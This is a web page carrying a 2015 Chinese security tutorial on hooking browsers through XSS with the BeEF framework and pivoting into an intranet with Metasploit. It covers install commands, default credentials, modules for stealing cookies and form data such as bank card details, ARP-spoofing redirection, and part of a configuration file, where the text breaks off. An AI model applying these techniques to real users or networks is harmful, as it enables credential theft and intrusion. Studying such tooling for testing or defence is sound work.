<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns:wb="http://open.weibo.com/wb" xml:lang="en" lang="en">
<head>
    <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
    <meta name="viewport"
          content="width=device-width,initial-scale=1,minimum-scale=1,maximum-scale=1,user-scalable=no"/>
    <link rel="shortcut icon" href="http://bobao.360.cn/favicon.ico?v=1.1"/>
    <link rel="alternate" title="安全资讯" href="/rss?type=news" type="application/rss+xml"/>
    <link rel="alternate" title="安全知识" href="/rss?type=learning" type="application/rss+xml"/>
    <link rel="alternate" title="安全圈活动" href="/rss?type=activity" type="application/rss+xml"/>
    <link rel="alternate" title="所有漏洞" href="/rss?type=vul" type="application/rss+xml"/>
    <link rel="alternate" title="通用型漏洞" href="/rss?type=commonvul" type="application/rss+xml"/>
    <link rel="alternate" title="事件型漏洞" href="/rss?type=eventvul" type="application/rss+xml"/>
    <link rel="alternate" title="热门漏洞" href="/rss?type=hotvul" type="application/rss+xml"/>

        <title>内网渗透一：利用Xss漏洞和IE漏洞进入内网 - 安全客 - 有思想的安全新媒体</title>
    
        <meta name="keywords" content="Xss漏洞,内网渗透,利用XSS进内网,内网漫游,beef-xss"/>
    
        <meta name="description" content="0x01:科普 Beef目前欧美最流行的WEB框架攻击平台，全称：The Browser Exploitation Framework Project. Beef利用简单的XSS漏洞，通过一段编写好的"/>
        <meta property="wb:webmaster" content="224437c7be31d633"/>

    <script type="text/javascript" src="http://s7.qhimg.com/!56caa871/xpc_sync_height.js"></script>
    <link rel="stylesheet" type="text/css" href="/css/reset.css" />
    <link rel="stylesheet" type="text/css" href="/css/common_new.css?v=4.4.2.1" />
    <link rel="stylesheet" type="text/css" href="/css/jquery.notyfy.css" />
    <link rel="stylesheet" type="text/css" href="/css/notyfy.theme.default.css" />
    <link rel="stylesheet" type="text/css" href="/css/s_common.css?v=2.2.7" media="only screen and
    (max-device-width:900px), only screen and (max-width:900px)" />
    <script type="text/javascript" src="/js/jquery.min.js?v=3.1"></script>
    <script type="text/javascript" src="/js/jquery.notyfy.js"></script>
    <script type="text/javascript" src="/js/iscroll.js"></script>
    <script src="http://js.passport.qihucdn.com/5.0.3.js"></script>
    <script type="text/javascript">
        var myScroll, myNavScroll;

        function iscrollLoaded() {
            myScroll = new IScroll('#wrapper',
                {
                    scrollX: true,
                    scrollY: false,
                    bounceEasing: 'circular',
                    eventPassthrough: true,
                    preventDefault: false,
                    bounceTime: 500
                }
            );
        }

        $(function () {

            //导航横向滚动


            function setNavWidth() {

                /* 计算导航宽度 */
                var allWidth = $(window).width();
                var scroller = $('#scroller');

                if (allWidth > 900) {
                    scroller.find('ul').add(scroller.find('.scroll')).removeAttr('style');
                    scroller.css('overflow', 'visible');
                    if (myNavScroll) myNavScroll.destroy();
                } else {

                    var width = 0;
                    scroller.find('.scroll').children('ul').children('li').each(function (index, el) {
                        if (!$(this).hasClass('mobile-hide')) {
                            width += $(this).outerWidth();
                        }
                    });
                    scroller.find('ul').add(scroller.find('.scroll')).width(width);

                    if (myNavScroll) myNavScroll.destroy();

                    myNavScroll = new IScroll('#scroller', {
                        scrollX: true,
                        scrollY: false,
                        momentum: false,
                        click: true
                    });

                }

            }

            setNavWidth();
            $(window).resize(function (event) {
                setNavWidth();
            });

        });

    </script>
</head>
<body onload="iscrollLoaded();">
<div style='margin:0 auto;width:0px;height:0px;overflow:hidden;'>
    <img src=""/>
</div>

<div id="is-mobile"></div>
<div class="container">
        <div class="mobile-header">
        <div class="header clearfix">
            <div class="header-wrapper clearfix">
                <a href="/index/index" class="logo"><img class="slogan" src="/img/logo.png?v=1.5"/></a>
                                <form id="search" class="search-box" action="/search/index" method="GET">
                    <input class="keys" name="keywords" type="text" placeholder="搜索漏洞" required="required">
                    <input class="icon" type="submit" value="">
                    <input type="hidden" name="type" value=""/>
                </form>
                <div class="bug">
                    <div class="name"><span class="seled">全部</span><i class="arrow"></i></div>
                    <ul class="typelist">
                        <li data-index="3"><a href="javascript:void(0);">全部</a></li>
                        <li data-index="0"><a href="javascript:void(0);">漏洞</a></li>
                        <li data-index="1"><a href="javascript:void(0);">资讯</a></li>
                        <li data-index="2"><a href="javascript:void(0);">知识</a></li>
                    </ul>
                </div>
                                <div class="logNreg mobile-hide">
                    <div class="unlog">
                        <i></i>
                        <a href="log.html" class="log">登录</a>
                        <span>|</span>
                        <a href="reg.html" class="reg">注册</a>
                    </div>
                    <div class="loged">
                        <a href="/member/profile" class="user-center"><i></i><span class="user-name-tag">个人中心</span></a>
                        <div class="user-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting"><a href="http://i.360.cn/profile/accountmanage"
                                                               target="_blank"><i></i><span>账号设置</span></a></li>
                                <li class="alert-setting"><a href="/keywords/index"
                                                             target="_blank"><i></i><span>告警设置</span></a></li>
                                <li class="bug-alert"><a href="/myalarm/index" target="_blank"><i></i><span>漏洞告警</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mylearn/index" target="_blank"><i></i><span>我的知识</span></a>
                                </li>
                                <li class="my-knowl"><a href="/mycourse/index" target="_blank"><i></i><span>我的课堂</span></a>
                                </li>
                                <li class="my-exit"><a
                                            href="http://login.360.cn/?src=pcw_adlab&op=logout&destUrl=http://bobao.360.cn"><i></i><span>退出系统</span></a>
                                </li>
                            </ul>
                        </div>

                        <a href="/message" class="message-center" target="_blank"><i></i><span>我的消息</span></a>
                        <div class="message-links">
                            <span class="arrow"></span>
                            <ul>
                                <li class="account-setting" style="display:none;"><a href="/myres/index"
                                                                                     target="_blank"><i></i><span>回复我的</span></a>
                                </li>
                                <li class="my-bug"><a href="/myvul/index"
                                                      target="_blank"><i></i><span>我的漏洞</span></a></li>
                                <!--<li class="my-bug"><a href="/myres/index" target="_blank"><i></i><span>我的评论</span></a></li>-->
                                <!--<li class="alert-setting"><a href="###" target="_blank"><i></i><span>提到我的</span></a>
                                </li>-->
                            </ul>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <style type="text/css">
            .nav {
                overflow: hidden;
            }

            .nav .scroll {
                width: auto;
            }
        </style>
        <div id="wrapper">
            <div id="scroller" class="nav">
                <div class="scroll">
                    <ul class="nav-list">
                        <li ><a class="link-nav"
                                                                                 href="/index/index">首页</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/vul/index">漏洞</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/introduce/list">招聘</a>
                        </li>
                        <li >
                        <a class="link-nav" href="/news/index">资讯</a><!--<i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/introduce/list">招聘</a></li>
                        </ul>
			-->
                        </li>
                        <li class="cur">
                        <a class="link-nav" href="/learning/index">知识</a><i class="arrow mobile-hide"></i>
                        <ul class="subnav-list mobile-hide">
                            <li><a class="link-subnav" href="/course/index">学院</a></li>
                        </ul>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/activity/index">活动</a></li>
                        <li class="mobile-hide "><a class="link-nav"
                                                                                                   href="/ctf/index">CTF训练营</a>
                        </li>
                        <li ><a class="link-nav"
                                                               href="/interref/list">安全内参</a></li>
                        <li ><a class="link-nav" href="/app/index">APP</a></li>

                        <!--<li ><a href="/course/index">学院</a></li>-->
                        <!--<li ><a href="/introduce/list">招聘</a></li>-->
                        <!--<li  class="mobile-hide"><a href="/ctf/index">CTF训练营</a></li>-->
                    </ul>
                </div>
            </div>
        </div>
    </div>
    
    <div class="mobile-content">
        <link rel="stylesheet" type="text/css" href="/css/news.css?v=3.5" />
<link rel="stylesheet" type="text/css" href="/ue/SyntaxHighlighter/shCoreDefault.css?v=1.0" />
<style>
    p .syntaxhighlighter {
        width: 80%;
    }
</style>

<div class="cur-pos w1000">当前位置：<a href="http://bobao.360.cn/">安全客</a> &gt;&gt; 知识详情</div>

<div class="content clearfix">
    <div class="main">
        <div class="article">
            <div id="article_box">
                <h2>内网渗透一：利用Xss漏洞和IE漏洞进入内网</h2>
                <div class="article-msg">
                    <span class="time">2015-03-16 22:01:45</span>
                                        <span class="read">阅读：60553次</span>
                    <span><a style="display: none;" class="good" href="javascript:;"
                             data-target="/learning/good" data-value="g_300"
                             data-type="learning">点赞(0)</a></span>
                    <span><a class="fav" href="javascript:;" data-target="/mylearning/add"
                             data-pk="300" data-type="learning">收藏</a></span>
                                        <span><a style="margin-left: 4px;" class="fav" href=""
                             target="_blank">来源： 360安全播报</a></span>
                    
                                    </div>
                <hr size="1">
                <div class="article-msg">
                    <p><!-- JiaThis Button BEGIN -->

<!--
<span class="jiathis_style"><span class="jiathis_txt">分享到：</span>
	<a class="jiathis_button_weixin"></a>
	<a class="jiathis_button_tsina"></a>
    <a class="jiathis_button_tqq"></a>
    <a class="jiathis_button_qzone"></a>
    <a class="jiathis_button_renren"></a>
    <a class="jiathis_button_xiaoyou"></a>
    <a href="http://www.jiathis.com/share" class="jiathis jiathis_txt jiathis_separator jtico jtico_jiathis" target="_blank"></a>
</span>

-->
</p>
                </div>
                <p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212); font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><strong>0x01:科普 </strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Beef目前欧美最流行的WEB框架攻击平台，全称：The Browser Exploitation Framework Project. Beef利用简单的XSS漏洞，通过一段编写好的JavaScript（hook.js）控制目标主机的浏览器，通过目标主机浏览器获得该主机的详细信息，并进一步扫描内网，配合metasploit绝对是内网渗透一大杀器。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">官网&nbsp; </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="http://beefproject.com/"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">http://beefproject.com/</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">博客&nbsp; </span><a style="text-decoration: underline; font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;" href="http://blog.beefproject.com/"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">http://blog.beefproject.com/</span></a></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212); font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><strong>&nbsp;0x02安装</strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Kali linux 系统默认未安装beef，需要自行安装。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><br/></span></p><pre class="brush:bash;toolbar:false">apt-get&nbsp;update
apt-get&nbsp;install&nbsp;beef-xss</pre><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212); font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><strong><br/></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212); font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><strong>0x03入门</strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">0x03.1启动</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">主目录：</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">/usr/share/beef-xss</span></p><pre class="brush:bash;toolbar:false">cd&nbsp;/usr/share/beef-xss
./beef</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><br/></span></p><p style="text-align:center"><img style="width: 600px; height: 310px;" alt="t01287a4dec5cc49b91.png" src="http://p3.qhimg.com/t013a47c5dafc48df08.png" title="t01287a4dec5cc49b91.png" height="310" border="0" vspace="0" width="600"/></p><p style="text-align:center"><img style="width: 600px; height: 320px;" alt="t0178b9b1ea09d0e72b.png" src="http://p3.qhimg.com/t0195bdcf978c491bd5.png" title="t0178b9b1ea09d0e72b.png" height="320" border="0" vspace="0" width="600"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">127.0.0.1：3000/ui/pannel </span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">账号密码</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">beef/beef</span></p><p style="text-align:center"><img style="width: 600px; height: 375px;" alt="t01fac022bc1ad5e4aa.png" src="http://p7.qhimg.com/t01c98c1c6983cdcc50.png" title="t01fac022bc1ad5e4aa.png" height="375" border="0" vspace="0" width="600"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">demos:Beef-Xss ip:3000/demos/butcher/index.html</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">测试两台主机网络通信是否正常：</span></p><p style="text-align:center"><img style="width: 600px; height: 393px;" alt="t011e6491eb9aafbd00.png" src="http://p1.qhimg.com/t01c89abe94aa329bd3.png" title="t011e6491eb9aafbd00.png" height="393" border="0" vspace="0" width="600"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">访问Beef demo页面</span></p><p style="text-align:center"><img style="width: 600px; height: 346px;" alt="t01dc43ebf9a8fb188b.png" src="http://p5.qhimg.com/t01493659aefabc8abc.png" title="t01dc43ebf9a8fb188b.png" height="346" border="0" vspace="0" width="600"/></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><span style="font-size: 14px; font-family: Helvetica;">demo</span><span style="font-size: 14px; font-family: &quot;Heiti SC&quot;;">页面嵌入了</span><span style="font-size: 14px; font-family: Helvetica;">hook</span><span style="font-size: 14px; font-family: &quot;Heiti SC&quot;;">.</span><span style="font-size: 14px; font-family: Helvetica;">js </span><span style="font-size: 14px; font-family: &quot;Heiti SC&quot;;">访问</span><span style="font-size: 14px; font-family: Helvetica;">-</span><span style="font-size: 14px; font-family: &quot;Heiti SC&quot;;">&gt;中招</span></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);"><strong><strong>0x0</strong>4挂马：</strong></span></p><p style="text-align: left; text-indent: 2em;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">在正常页面添加script标签，嵌入恶意脚本</span></p><p style="text-align:center"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"></span></p><p style="text-align:center"><img style="width: 400px; height: 24px;" alt="t01bd3f243cd506ca12.png" src="http://p9.qhimg.com/t017e656011aa75ab25.png" title="t01bd3f243cd506ca12.png" height="24" border="0" vspace="0" width="400"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">在实际渗透中（需要一个公网的IP),如何让受害者访问我们嵌有hook.js的页面呢？</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">网站反馈页面，举报页面案例：<a target="_blank" href="http://www.91ri.org/3839.html">用Xss平台沦陷百度投诉中心后台</a></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">当然，这位同学用的是Xss平台，而不是beef,利用Beef的话，不仅能得到后台管理员的Cookie，再配合Metasploit，还能以管理员主机浏览器当做跳板，进入公司内网。</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Online Browersers-&gt;右击-&gt;Use As Proxy </span></p><p style="text-align:center"><img alt="http://p5.qhimg.com/t0107cb7746a23e6d35.jpg" src="http://p7.qhimg.com/t015f2bd7a3225e9ce3.jpg" title="t0107cb7746a23e6d35.jpg"/></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">再配合ARP攻击，MITM中间人攻击，对内网内所有Http请求重定向基本...(这里露出一个你懂的WS笑容)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Beef后台检测到有主机上线（感觉好像当年玩的灰鸽子、上兴 =。= 囧）</span></p><p style="text-align:center"><a href="http://p0.qhimg.com/t016bd52ff0f6e09d92.png" target="_blank"><img style="visibility: visible; width: 600px; height: 366px;" alt="t016bd52ff0f6e09d92.png" src="http://p9.qhimg.com/t01261ecbe14d053e5b.png" title="t016bd52ff0f6e09d92.png" height="366" border="0" vspace="0" width="600"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">&nbsp;通过浏览器，我们可以看到目标主机的很多信息：</span></p><pre class="brush:html;toolbar:false">浏览器信息：
名称
版本
Browser&nbsp;UA&nbsp;String
Browser&nbsp;Platform
Windows&nbsp;size
插件基本信息：
Flash
VBS脚本
Web&nbsp;Sock
Quick&nbsp;Time
...
Api信息
Cookie
操作系统信息
Date&nbsp;时间日期
硬件信息
Cpu&nbsp;（32/64）
屏幕分辨率
是否支持触屏</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">And So On</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">用火狐浏览器测试</span></p><p style="text-align:center"><a href="http://p8.qhimg.com/t0191ac372d53212d0d.png" target="_blank"><img style="visibility: visible; width: 600px; height: 392px;" alt="t0191ac372d53212d0d.png" src="http://p9.qhimg.com/t01725cff39623f508e.png" title="t0191ac372d53212d0d.png" height="392" border="0" vspace="0" width="600"/></a></p><p style="text-align:center"><a href="http://p3.qhimg.com/t011909d221bef87b75.png" target="_blank"><img style="visibility: visible; width: 600px; height: 377px;" alt="t011909d221bef87b75.png" src="http://p9.qhimg.com/t01b390a5ae4f2203cb.png" title="t011909d221bef87b75.png" height="377" border="0" vspace="0" width="600"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Beef功能模块组件</span></p><p style="text-align:center"><a href="http://p4.qhimg.com/t0107b9a9293df76b82.jpg" target="_blank"><img style="visibility: visible;" alt="http://p6.qhimg.com/t013e83e9938073faa9.jpg" src="http://p4.qhimg.com/t0106320a81bfa750d9.jpg" title="t013e83e9938073faa9.jpg"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="color: rgb(84, 141, 212);"><strong><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">常用功能/模块</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><br/></span></p><pre class="brush:html;toolbar:false">Browser:获取浏览器信息
--Hooked&nbsp;Domain
-----Get&nbsp;Cookie&nbsp;获取客户端Cookie信息&nbsp;执行一次命令在右边显示Cookie；
-----Get&nbsp;From&nbsp;Value&nbsp;获取页面提交的表单信息：截获填写的银行卡信息、注册页面的用户名密码；
-----Redirect&nbsp;Browser&nbsp;浏览器重定向</pre><p style="text-align:center"><a href="http://p2.qhimg.com/t011ca9c6d662701d53.jpg" target="_blank"><img style="visibility: visible; width: 600px; height: 323px;" alt="t011ca9c6d662701d53.jpg" src="http://p6.qhimg.com/t01ea9dcc8a94bf481a.jpg" title="t011ca9c6d662701d53.jpg" height="323" border="0" vspace="0" width="600"/></a></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">执行后，目标浏览器访问任何网站都将会被重定向到bobao.360.cn,实际渗透的时候在内网实施ARP攻击，将内网所有Http请求流量重定向到嵌入了Hook恶意脚本的页面...(在这里露出一个淫荡的笑容)</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><br/></span></p><pre class="brush:html;toolbar:false">Chrome&nbsp;Extensions:
Debug:测试Http请求
Exploits:利用浏览器漏洞进行攻击
Host：获取受害者主机信息
Mtasploit:结合Metasploit进行渗透，这个也是本文的重点。
Network:进行Doser、ping、DNS枚举、端口扫描等等
Social&nbsp;Enhineering：社工模块</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><br/></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; color: rgb(84, 141, 212); font-size: 16px;"><strong><span style="font-size: 14px; color: rgb(84, 141, 212); font-family: 微软雅黑,Microsoft YaHei;"><span style="color: rgb(84, 141, 212); font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;"><strong>0x0</strong></span>5与Metasploit联动</span></strong></span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">Beef配置文件</span></p><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px; color: rgb(84, 141, 212);">/usr/share/beef-xss/config.yaml&nbsp;&nbsp; </span></p><pre class="brush:bash;toolbar:false">&nbsp;&nbsp;metasploit:
enable:&nbsp;false</pre><p style="text-indent: 2em; text-align: left;"><span style="font-family: 微软雅黑,Microsoft YaHei; font-size: 14px;">改成 <br/></span></p><pre class="brush:bash;toolbar:false">metasploit:
enable:&nbsp;true</pre><pre class="brush:bash;toolbar:false">vim&nbsp;/usr/share/beef-xss/config.yaml</pre><pre class="brush:bash;toolbar:false">#&nbsp;Copyright&nbsp;(c)&nbsp;2006-2013&nbsp;Wade&nbsp;Alcorn&nbsp;-&nbsp;wade@bindshell.net
#&nbsp;Browser&nbsp;Exploitation&nbsp;Framework&nbsp;(BeEF)&nbsp;-&nbsp;http://beefproject.com
#&nbsp;See&nbsp;the&nbsp;file&nbsp;&#39;doc/COPYING&#39;&nbsp;for&nbsp;copying&nbsp;permission
#
#&nbsp;BeEF&nbsp;Configuration&nbsp;file
beef:
&nbsp;&nbsp;&nbsp;&nbsp;version:&nbsp;&#39;0.4.4.5-alpha&#39;
&nbsp;&nbsp;&nbsp;&nbsp;debug:&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;restrictions:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;subnet&nbsp;of&nbsp;browser&nbsp;ip&nbsp;addresses&nbsp;that&nbsp;can&nbsp;hook&nbsp;to&nbsp;the&nbsp;framework
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;permitted_hooking_subnet:&nbsp;&quot;0.0.0.0/0&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;subnet&nbsp;of&nbsp;browser&nbsp;ip&nbsp;addresses&nbsp;that&nbsp;can&nbsp;connect&nbsp;to&nbsp;the&nbsp;UI
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;permitted_ui_subnet:&nbsp;&quot;127.0.0.1/32&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;permitted_ui_subnet:&nbsp;&quot;0.0.0.0/0&quot;
&nbsp;&nbsp;&nbsp;&nbsp;http:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;debug:&nbsp;false&nbsp;#Thin::Logging.debug,&nbsp;very&nbsp;verbose.&nbsp;Prints&nbsp;also&nbsp;full&nbsp;exception&nbsp;stack&nbsp;trace.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;host:&nbsp;&quot;0.0.0.0&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port:&nbsp;&quot;3000&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Decrease&nbsp;this&nbsp;setting&nbsp;up&nbsp;to&nbsp;1000&nbsp;if&nbsp;you&nbsp;want&nbsp;more&nbsp;responsiveness&nbsp;when&nbsp;sending&nbsp;modules&nbsp;and&nbsp;retrieving&nbsp;results.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;It&#39;s&nbsp;not&nbsp;advised&nbsp;to&nbsp;decrease&nbsp;it&nbsp;with&nbsp;tons&nbsp;of&nbsp;hooked&nbsp;browsers&nbsp;(more&nbsp;than&nbsp;50),
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;because&nbsp;it&nbsp;might&nbsp;impact&nbsp;performance.&nbsp;Also,&nbsp;enable&nbsp;WebSockets&nbsp;is&nbsp;generally&nbsp;better.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;xhr_poll_timeout:&nbsp;5000
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;if&nbsp;running&nbsp;behind&nbsp;a&nbsp;nat&nbsp;set&nbsp;the&nbsp;public&nbsp;ip&nbsp;address&nbsp;here
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#public:&nbsp;&quot;&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#public_port:&nbsp;&quot;&quot;&nbsp;#&nbsp;port&nbsp;setting&nbsp;is&nbsp;experimental
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;DNS
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dns_host:&nbsp;&quot;localhost&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;dns_port:&nbsp;53
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;panel_path:&nbsp;&quot;/ui/panel&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hook_file:&nbsp;&quot;/hook.js&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;hook_session_name:&nbsp;&quot;BEEFHOOK&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;session_cookie_name:&nbsp;&quot;BEEFSESSION&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Allow&nbsp;one&nbsp;or&nbsp;multiple&nbsp;domains&nbsp;to&nbsp;access&nbsp;the&nbsp;RESTful&nbsp;API&nbsp;using&nbsp;CORS
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;For&nbsp;multiple&nbsp;domains&nbsp;use:&nbsp;&quot;http://browserhacker.com,&nbsp;http://domain2.com&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;restful_api:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;allow_cors:&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;cors_allowed_domains:&nbsp;&quot;http://browserhacker.com&quot;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;#&nbsp;Prefer&nbsp;WebSockets&nbsp;over&nbsp;XHR-polling&nbsp;when&nbsp;possible.
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;websocket:
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;enable:&nbsp;false
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;secure:&nbsp;true&nbsp;#&nbsp;use&nbsp;WebSocketSecure&nbsp;work&nbsp;only&nbsp;on&nbsp;https&nbsp;domain&nbsp;and&nbsp;whit&nbsp;https&nbsp;support&nbsp;enabled&nbsp;in&nbsp;BeEF
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;port:&nbsp;61985&nbsp;#&nbsp;WS:&nbsp;good&nbsp;success&nbsp;rate&nbsp;through&nbsp;proxies
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;secure_port:&nbsp;61986&nbsp;#&nbsp;WSSecure
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;ws_poll_timeout:&nbsp;1000&nbsp;#&nbsp;poll&nbsp;BeEF&nbsp;every&nbsp;second
